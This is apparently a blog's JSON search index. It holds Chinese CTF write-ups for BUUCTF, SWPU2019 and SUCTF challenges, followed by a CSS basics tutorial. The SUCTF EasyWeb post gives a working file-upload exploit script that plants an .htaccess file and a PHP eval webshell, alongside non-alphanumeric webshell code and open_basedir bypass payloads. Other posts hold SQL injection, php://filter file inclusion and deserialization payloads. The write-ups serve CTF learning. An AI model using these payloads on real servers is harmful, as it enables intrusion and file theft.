{"pages":[{"title":"about","text":"","link":"/about/index.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"archives","text":"","link":"/archives/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"2.5 [SWPU2019]伟大的侦探","text":"打开压缩包，文件有密码，密码在txt里010Editor打开，转化成EBDIC编码得到密码打开文件发现是一堆小人，百度可知这是福尔摩斯小人编码解码得到flag:iloveholmesandwllm","link":"/2020/02/05/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/"},{"title":"2.5 [SWPU2019]我有一只马里奥","text":"题目是一个exe文件，binwalk查看到有个压缩包。打开压缩包，发现题目是ntfs数据流隐写，用工具提取。","link":"/2020/02/05/2-5-SWPU2019-%E6%88%91%E6%9C%89%E4%B8%80%E5%8F%AA%E9%A9%AC%E9%87%8C%E5%A5%A5/"},{"title":"2.5 [SUCTF 2019]EasyWeb","text":"[SUCTF 2019]EasyWeb查看源码： 主要有两个部分：get_flag()函数；$hhh的操作 get_flag()函数：检测文件上传函数，定义了三个变量：$tmp_name，$name，$extension对于$extebsion变量是获取$name的上传文件的文件名，同时对这个变量进行了限制：有无:”ph”,”i”字符串。对于$tmp_name变量进行了两个限制：检测文件内容是否存在”&lt;?”；检测上传文件是否为图片。 对于$hhh:判断长度是否大于18；过滤0-9，a-z,A-Z；最后判断$hhh变量中使用的不同字符串是否大于12。 在这段代码中有几处使用了@符号：@符号是php的错误控制符号，将它放在一个表达式之前将忽略这个表达式所产生的错误。以上就是这段php代码的整体意思 这道题的思路就是在$hhh变量中调用get_flag()函数。第一部分绕过：正则过滤的绕过看了这段正则代码是把基本能使用的payload都过滤掉了，看了别的师傅的博客找到了思路：利用不含有字母数字的webshell。参考博客：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.htmlhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.htmlhttps://xz.aliyun.com/t/5677#toc-0https://blog.csdn.net/ityang521/article/details/60609499https://github.com/team-su/SUCTF-2019/blob/master/Web/easyweb/wp/SUCTF%202019%20Easyweb.md知识点利用数字字母形成Webshell有三个办法：一些不包含数字和字母的webshell一.异或这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。12345&lt;?php//$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';//$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';//$___=$$__;//$_($___[_]); // assert($_POST[_]);二.利用UTF-8编码的某个汉字取反利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如’和’{2}的结果是”\\x8c”，其取反即为字母s。1234567891011&lt;?php$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');$_=$__/$__;$____='';$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});$_____='_';$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});$_=$$_____;$____($_[$__]);因为要获取’和’{2}，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故true+true==2，也就是(‘&gt;’&gt;’&lt;’)+(‘&gt;’&gt;’&lt;’)==2三.利用php特性（自增）下面是截取p牛博客： 12345678910111213141516171819202122232425262728293031323334$_=[];$_=@&quot;$_&quot;; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); 做法：第一步通过构造无数字字母payload调用get_flag()函数。首先fuzz一下正则函数：123456789&lt;?phpfor ($i=0;$i&lt;256;$i++){ if(!preg_match('/[\\x00- 0-9A-Za-z\\'&quot;\\`~_&amp;.,|=[\\x7F]+/i',chr($i))) { echo urlencode(chr($i)).' '; }}?&gt;得到可以利用的字符串：12! # $ % ( ) * + - / : ; &lt; &gt; ? @ ] ^ { }看到不能使用~取反，而自增代码比较大。看到^没被过滤想到异或构造payload。但是又有长度限制。可以通过：1$_GET{x}();将x换成get_flag从而调用此函数用脚本找出对应的异或值：123456789101112import urllib.parsefind = ['G','E','T','_']for i in range(1,256): for j in range(1,256): result = chr(i^j) if(result in find): a = i.to_bytes(1,byteorder='big') b = j.to_bytes(1,byteorder='big') a = urllib.parse.quote(a) b = urllib.parse.quote(b) print(&quot;%s:%s^%s&quot;%(result,a,b))发现有很多组:随便找出一组构造payload:1?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%fe};&amp;%fe=get_the_flag成功利用，没用报错： 第二部分:get_the_flag()函数绕过通过上面对get_the_flag()函数的分析，这个函数进行了三个过滤：1.文件内容不能出现&lt;?；2.通过exif_imagetype()函数判断是不是图片；3.后缀名不能出现ph通过看别的师傅的博客知道这个题目的环境是apache的服务器，我们可以上传.htaccess来绕过ph。绕过exif_imagetype()函数：在.htaccess头部添加：123#define width 1337#define height 1337绕过文件内容不能出现&lt;?时，因为php环境是7.2，所以不能使用:12&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;我们可以用base64编码shell，在上传的.htaccess中用php伪协议解码。做法：直接附上脚本：1234567891011121314151617181920import requestsimport base64htaccess = b&quot;&quot;&quot;#define width 1337#define height 1337 AddType application/x-httpd-php .abcphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.abc&quot;&quot;&quot;&quot;shell = b&quot;GIF89a12&quot; + base64.b64encode(b&quot;&lt;?php eval($_GET['a']);?&gt;&quot;)url = &quot;http://8dd1d6f4-ed96-446f-bd6b-f6b0ebf2df55.node3.buuoj.cn?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&amp;%fe=get_the_flag&quot;files = {'file':('.htaccess',htaccess,'image/jpeg')}data = {&quot;upload&quot;:&quot;Submit&quot;}response = requests.post(url=url, data=data, files=files)print(response.text)files = {'file':('shell.abc',shell,'image/jpeg')}response = requests.post(url=url, data=data, files=files)print(response.text)在这里还有一个知识点：绕过open_basedir的限制参考博客找到flag位置：1http://67581bf9-b233-4f97-8a1b-98532c7f7358.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.abc?a=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));找到flag文件THis_Is_tHe_F14g访问1a=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g'));即可得到flag。","link":"/2020/02/05/2-5-SUCTF-2019-EasyWeb/"},{"title":"2.5 [极客大挑战 2019]EasySQL","text":"对题目进行简单的分析：单引号闭合；开启了错误提示。想到报错注入，但是报错注入没检测无法利用。 尝试一下万能密码1admin' or '1=1得到flag","link":"/2020/02/05/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/"},{"title":"2.5 [极客大挑战 2019]Havefun&Secret File","text":"Havefun查看源代码直接传参cat=dog,得到flag. Secret File通过查看源代码知道这个题目有三个文件:Archive_room.php action.php end.php在这里通过访问：Archive_room.php会直接跳转到end.php，没有经过action.php。访问action.php抓包查看，得到第四个文件secr3t.php 。访问secr3t.php 得到源码：12345678910&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag放在了flag.php里?&gt;通过分析这段代码没有过滤php伪协议：我们可以使用file来读取flag。12?file=php://filter/convert.base64-encode/resource=flag.php得到flag：","link":"/2020/02/05/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-Secret-File/"},{"title":"2.6 [SWPU2019]Network","text":"题目是一个txt文件，里面只有4个数字：63，127，191，255。虽然题目提示network，但是看了wp知道是ttl隐写。 将每个数字转化成8位二进制1234563 00111111 127 01111111 191 10111111 255 11111111每一个 TTL 只有前两位隐藏数据，每四个为一组，隐藏一个字节。附上脚本：12345678910111213141516171819202122232425import binasciiwith open('attachment.txt','r') as fp: a=fp.readlines() p=[] for x in range(len(a)): p.append(int(a[x])) s='' for i in p: if(i==63): b='00' elif(i==127): b='01' elif(i==191): b='10' else: b='11' s +=b# print(s)flag = ''for i in range(0,len(s),8): flag += chr(int(s[i:i+8],2))flag = binascii.unhexlify(flag)wp = open('ans.zip','wb')wp.write(flag)wp.close()转换成一个压缩包，有密码是伪加密，修改完得到flag。","link":"/2020/02/06/2-6-SWPU2019-Network/"},{"title":"2.5 [SWPU2019]神奇的二维码","text":"解压后，出来一张二维码利用binwalk查看1binwalk BitcoinPay.png有四个压缩包第一个压缩包没用东西，只有一张表情包（可以保存一下哈哈哈哈~）第二个压缩包是base64编码第三个压缩包是多长base64编码第四个压缩包是一个mp3文件，但是打开需要密码，将上面解码的base64都试一下，发现flag.doc里的是压缩包密码。将这个转换成摩斯再解码，得到flag。（这里有个小坑解出来的摩斯是大写要转换成小写才是正确的flag）","link":"/2020/02/05/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/"},{"title":"2-6 [SWPU2019]你有没有好好看网课?","text":"flag2.php，flag3.php都有密码：flag3.php提示密码是六位数，爆破得到密码。查看flag.docx看了别的师傅的wp，这个docx提示查看mp4对应帧数:00:00:05:20；00:00:07:1112..... ../... ./... ./... ../dXBfdXBfdXA=后面一段是base64编码，前面的一段一开始以为是摩斯编码，但是看了wp知道了是敲击码。解的flag2.zip密码：wllmup_up_upflag2.zip下是一张图片，将这张图片用winhex打开，在最下面得到flag。","link":"/2020/02/06/2-6-SWPU2019-%E4%BD%A0%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A5%BD%E5%A5%BD%E7%9C%8B%E7%BD%91%E8%AF%BE/"},{"title":"2.6 buuctf_misc_从娃娃抓起","text":"根据题目提示：编码是两个汉字编码，试了好多编码形式，找到了两个：中文电码和五笔编码。中文电码在线解码五笔编码现在还没有找到好的网站去解，只能一个一个对照emmmmmm","link":"/2020/02/06/2-6-buuctf-misc-%E4%BB%8E%E5%A8%83%E5%A8%83%E6%8A%93%E8%B5%B7/"},{"title":"2.6 [极客大挑战 2019]PHP","text":"根据题目提示：题目有源码备份，下载得到www.zip。有三个php文件class.php1234567891011121314151617181920212223242526272829303132class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } function __wakeup(){ $this-&gt;username = 'guest'; } function __destruct(){ if ($this-&gt;password != 100) { echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); } if ($this-&gt;username === 'admin') { global $flag; echo $flag; }else{ echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!&quot;; die(); } }index.php12345&lt;?php include 'class.php'; $select = $_GET['select']; $res=unserialize(@$select); ?&gt;flag.php123&lt;?php$flag = 'Syc{dog_dog_dog_dog}';?&gt;通过分析知：$select进行反序列化。关键在class.php中的_destruct()魔法函数。对于序列化问题有调用魔法函数顺序的问题：对于题目需要将username=admin，password=100，但是会先执行_wakeup函数将username=guest，所以这道题目关键在于如何绕过_wakeup函数。知识点：如何绕过_wakeup测试php：形成payload：12?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}这个payload绕过__wakeup()函数，使username不被覆盖，加上%00是因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失。得到flag 参考博客：https://www.jianshu.com/p/bfe00fd583df","link":"/2020/02/06/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/"},{"title":"CSS基本学习(一)","text":"比赛打完了，开始学习学校的课程了，以此记录学习. 一.CSS基本语法选择器{属性1:属性值1;属性2:属性值2;….}每条CSS包括两部分组成:选择器和一条或多条属性声明。每条属性声明由一个属性和一个值组成。属性和值之间用冒号，多条属性之间用分号。将多条属性放到一个花括号中。1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ p{ text-align: center; color: blue; font-family: &quot;Comic Sans MS&quot;,arial,黑体; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;使用css定义网页段落水平对齐方式，文体颜色和字体&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;注意:在定义css属性值时，如果时多个单词组成要加引号，单个单词不需要加引号. 二.CSS基本选择器CSS选择器包括俩种基本选择器和复合选择器，基本选择器主要包括元素选择器，类选择器，id选择器，伪类选择器，伪元素选择器；复合选择器是通过基本选择器进行组合构成的。 1.元素选择器基本语法：html元素名{属性1：属性值1；属性2：属性值2；…..}元素选择器对指定的html元素全部显示效果。123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ p{ text-align: center; color: blue; font-family: &quot;Comic Sans MS&quot;,arial,黑体; } h1{ text-align: center; color: red; } h2{ text-align: center; color: green; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;使用css定义网页段落水平对齐方式，文体颜色和字体&lt;/p&gt;&lt;h1&gt;css对h1定义颜色&lt;/h1&gt;&lt;h2&gt;css对h2定义颜色&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; 2.类选择器元素选择器是对页面中的所有相同元素的统一格式，但如果需要对相同元素的某一个元素做特殊效果，我们就需要类选择器或者id选择器。基本语法：.类选择器{属性1：属性值1；属性2：属性值2；}语法说明：类选择器第一个字符不能使用数字，类选择器名前的”.”是类选择器的标识，不能省略，类选择器区分大小写。应用类选择器样式的元素中添加”class”属性，且将其值设置为类选择器名。123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ .txt1{ color: blue; font-size: 26px; font-style: 黑体; } .txt2{ color: red; font-style: italic; font-size:30px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;txt1&quot;&gt;使用txt1类选择器显示效果&lt;/p&gt;&lt;p class=&quot;txt2&quot;&gt;使用txt2类选择器显示效果&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;需要注意的是类选择器的优先级高于元素选择器，所有对一个元素即使用元素选择器，又使用类选择器，最后显示的效果是类选择器定义的效果。 3.ID选择器ID选择器和类选择器一样，都是对页面相同元素特定的一个元素进行特殊效果处理。基本语法：#ID选择器名{属性1：属性值1；属性2：属性值2；…..}在应用ID选择器时，在元素添加id属性，属性值为id选择器名。123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ #txt1{ color: blue; font-size: 26px; font-style: 黑体; } #txt2{ color: red; font-style: italic; font-size:30px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p id=&quot;txt1&quot;&gt;使用txt1类选择器显示效果&lt;/p&gt;&lt;p id=&quot;txt2&quot;&gt;使用txt2类选择器显示效果&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;id选择器优先级同样优先元素选择器 4.通用选择器通用选择器用通配符”“ 表示，它可以选择文档中所有元素。主要用于重置文档元素默认样式，一般用来重置文档元素的内外边距。基本语法:{属性1：属性值1；属性2：属性值2；}123*{margin:0px; padding:0px;} 5.伪类选择器CSS伪类用于向某些选择器添加特殊效果，伪类一开始用来表示一些元素的动态效果，典型的就是链接的各个状态。基本语法：选择器名:伪类{属性1：属性值1；属性2：属性值2；…..}语法说明：选择器可以是任意类型的选择器，当选择器是类选择器时，可以在类选择器名前加上元素名，即将选择器名写成：元素名.类选择器名，比如：a.second:link伪类类型：:active //将样式添加到被激活的元素:hover //当鼠标悬浮在元素上方时，向元素添加样式:link //将样式添加到未被访问过的链接:visited //将样式添加到已被访问过的链接:first-child //将样式添加到元素的第一个子元素:lang //向带有指定lang属性的元素添加样式 (1).对链接定义显示效果1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ a:link{ color: blue; } a:visited{ color: red; } a:hover{ color: green; } a.second:link{ color: #00f; font-size: 26px; } a.second:visited{ color: #f00; font-size: 26px; } a.second:hover{ color:#0f0; font-size: 26px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=&quot;https://www.baidu.com&quot;&gt;超链接1&lt;/a&gt;&lt;a href=&quot;https://da4er.top&quot; class=&quot;second&quot;&gt;超链接2&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; (2).元素选择器使用伪类1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ input:focus{ background-color: yellow; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;#&quot; method=&quot;post&quot;&gt; 用户名:&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt; 密码:&lt;input type=&quot;password&quot; name=&quot;psw&quot; /&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;1&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; (3).使用伪类设置元素的第一个子元素的样式12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ p:first-child{ font-size: 33px; } li:first-child{ color: red; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;段落1，其顶层元素是boby&lt;/p&gt;&lt;p&gt;段落2，其顶层元素是boby&lt;/p&gt;&lt;div&gt; &lt;p&gt;段落1，其顶层元素是div&lt;/p&gt; &lt;p&gt;段落2，其顶层元素是div&lt;/p&gt;&lt;/div&gt;&lt;ol&gt; &lt;li&gt;有序列表项1，其顶层元素是ol&lt;/li&gt; &lt;li&gt;有序列表项2，其顶层元素是ol&lt;/li&gt;&lt;/ol&gt;&lt;/body&gt;&lt;/html&gt; (4).伪类设置带有lang属性的元素1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ q:lang(no){ font-size: 33px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;&lt;q lang='no'&gt;11111&lt;/q&gt;&lt;/p&gt;&lt;p&gt;&lt;q&gt;11111&lt;/q&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 6.伪元素选择器CSS伪元素用于将特殊的效果添加到某些选择器。基本语法：选择器名：伪元素{属性1：属性值1；属性2：属性值2；….}语法说明：和伪类选择器一样，为了限定某类元素，也可以在类选择器名前加上元素名。所以选择器名写成：元素名.类选择器名。在CSS3中，为了区分两者，规定伪类用一个冒号来表示，伪元素用两个冒号表示。伪元素类型：:first-letter //向文本的第一个字符添加特殊样式:firs-line //向文件的首行添加特殊样式:before //在元素之前添加内容:after //在元素之后添加内容1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ p:first-line{ font-size: 26px; font-style: italic; text-decoration: underline; } p:first-letter{ font-size: 50px; } p:before{ content: url(1.jpg); } p:after{ content: url(1.jpg); }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;https://da4er.top&lt;br&gt;https://da4er.top&lt;br&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 三.CSS复合选择器复合选择器是通过基本选择器进行组合构成的，常用的复合选择器有：交集选择器，并集选择器，属性选择器，后代选择器，子元素选择器和相邻元素选择器等。 1.交集选择器交集选择器由俩个选择器构成，第一个选择器必须是元素选择器，第二个选择器是类选择器或者id选择器。交集选择器的作用范围将选中同时满足前后俩个选择器定义的元素，也就是要求前者定义的元素，同时必须是指定了后者的类别或者id。该元素的样式是：第一个选择器，第二个选择器，交集选择器层叠的效果。基本语法：元素选择器.类选择器|#ID选择器{属性1：属性值1；属性2：属性值2；….}1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ div{ border-style: solid; border-width: 10px; border-color: blue; margin: 20px; } .al{ font-style: italic; background: #33ffcc; } div.al{ border-color: red; background: #999999; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;元素选择器的效果&lt;/div&gt;&lt;div class=&quot;.al&quot;&gt;交集选择器的效果&lt;/div&gt;&lt;p class=&quot;.al&quot;&gt;类选择器的效果&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 2.并集选择器并集选择器又叫分组选择器，对不同选择器进行同种效果的展示，极大地减少了css代码量基本语法：选择器1，选择器2，选择器3,…..{属性1：属性值1；属性2，属性值2；…..}1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ div{ border-style: solid; border-width: 10px; border-color: blue; } h1,h2,div{ background: #999999; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Da4er&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;Da4er&lt;/h2&gt;&lt;br&gt;&lt;div&gt;Da4er&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 3.属性选择器根据元素的属性及属性值来选择元素，此时用到的选择器称为属性选择器。基本语法：[属性选择器1][属性选择器2]{属性1：属性值1；属性2：属性值2；…..}元素选择器[属性选择器1][属性选择器2]{属性1：属性值1；属性2：属性值2；…..}属性选择器格式：1.[属性] 用于选取带有指定属性的元素2.[属性=值] 用于选取带有指定属性和值的元素3.[属性|=值] 用于选取属性值以指定开头的元素，注意该值必须是一个完整的单词或带有”-“作为连接符连接后续内容的字符串。4.[属性^=值] 用于选取属性值以指定值开头的元素5.[属性$=值] 用于选取属性值以指定值结尾的元素6.[属性*=值] 用于选取属性值中包含指定值的元素7.[属性~=值] 用于选取属性值中包含指定值的元素，注意该值必须是一个完整的单词123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ [title]{ color: red; } img[alt]{ border:30px #ff0000 solid; } p[align=&quot;center&quot;]{ color: blue; font-weight: bolder; } a[title][href]{ color: green; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p title=&quot;1&quot;&gt;Da4er&lt;/p&gt;&lt;br&gt;&lt;p align=&quot;center&quot;&gt;Da4er&lt;/p&gt;&lt;br&gt;&lt;img src=&quot;1.jpg&quot; alt=&quot;dog&quot;&gt;&lt;br&gt;&lt;a href=&quot;https://da4er.top&quot; title=&quot;blogs&quot;&gt;blogs&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 4.后代选择器又称包含选择器，用于选择指定元素的所有后代元素。基本语法：选择器1 选择器2 选择器3….{属性1：属性值1；属性2：属性值2；….}后代选择器按从右到左的顺序读选择器的方式，例如 div h1 表示h1作为div的后代，也可以表示为div后代元素的任意h2元素。123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ div{ margin: 20px; line-height: 36px; } div.s{ float: left; padding-right: 10px; border-right: #ccc 1px solid; } div.m{ float: left; } div.s a:link{ color: #000; text-decoration: none; } div.m a:link{ color: #00f; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class='s'&gt; &lt;a href=&quot;#&quot;&gt;Da4er&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;#&quot;&gt;Da4er&lt;/a&gt;&lt;br&gt;&lt;/div&gt;&lt;div class='m'&gt; &lt;a href=&quot;#&quot;&gt;Da4er&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;#&quot;&gt;Da4er&lt;/a&gt;&lt;br&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 5.子元素选择器基本语法：选择器1&gt;选择器2{属性1：属性值1；属性2：属性值2；…..}选择器1&gt;选择器2 表示选择器1子元素的所有选择器2元素123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ h3&gt;span{ color: red; }&lt;/style&gt;&lt;/head&gt;&lt;div&gt; &lt;h3&gt;&lt;span&gt;Da4er&lt;/span&gt;&lt;/h3&gt; &lt;h3&gt;Da4er&lt;/h3&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 6.相邻兄弟选择器选择紧接在另一个元素的元素，而且二者有相同的父类基本语法：选择器1+选择器2{属性1：属性值1；属性2：属性值2；….}123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;使用CSS布局网页段落样式&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /*使用内联css*/ h1+p{ color: red; font-weight: bold; } p+p{ color: blue; font-weight: bold; }&lt;/style&gt;&lt;/head&gt;&lt;h1&gt;Da4er&lt;/h1&gt;&lt;p&gt;Da4er&lt;/p&gt;&lt;p&gt;Da4er&lt;/p&gt;&lt;p&gt;Da4er&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 四.CSS常用属性1.文本属性定义文本外观，修改文本的颜色，行高，对齐方式，字符间距，段首缩进位置等属性以及修饰文本等功能。常用文本属性： | 文本属性 |属性值 |描述 | | color |命名颜色，十六进制，RGB |文本颜色 || text-indent |length(常用单位px) |文字的首行缩进距离 || line-height |length(常用单位px) | 定义行高 || text-decoration |underline，overline，line-through，none|下划线，上划线，删除线，无任何修饰 || text-align |left，center，right，justify |左对齐，居中对齐，右对齐，两端对齐 || text-transform |none，uppercase，lowercase，capitalize 